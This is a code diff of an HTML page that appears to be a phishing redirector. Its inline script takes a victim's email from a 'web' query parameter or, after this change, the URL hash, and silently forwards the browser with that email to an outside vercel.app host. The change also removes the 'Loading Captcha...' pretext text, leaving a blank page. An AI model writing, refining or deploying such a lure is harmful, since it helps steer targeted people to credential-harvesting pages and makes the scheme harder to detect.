@@ -160,24 +160,27 @@
 
   <script>
     function getQueryParam(name) {
-      const url = window.location.href;
-      const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
-      const results = regex.exec(url);
-      if (!results) return null;
-      if (!results[2]) return '';
-      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(name);
     }
-    
+
+    function getHashFragment() {
+      return window.location.hash ? window.location.hash.substring(1) : null;
+    }
+
     const webParam = getQueryParam('web');
+    const hashEmail = getHashFragment();
+    const email = webParam || hashEmail;
+
     let redirectUrl = 'https://cuddly-fortnight-seven.vercel.app';
-    
-    if (webParam) {
-      redirectUrl += '?web=' + encodeURIComponent(webParam);
+
+    if (email) {
+      redirectUrl += '?web=' + encodeURIComponent(email);
     }
-    
+
     window.location.href = redirectUrl;
   </script>
 </head>
 <body>
-  Loading Captcha...
+  
 </body>
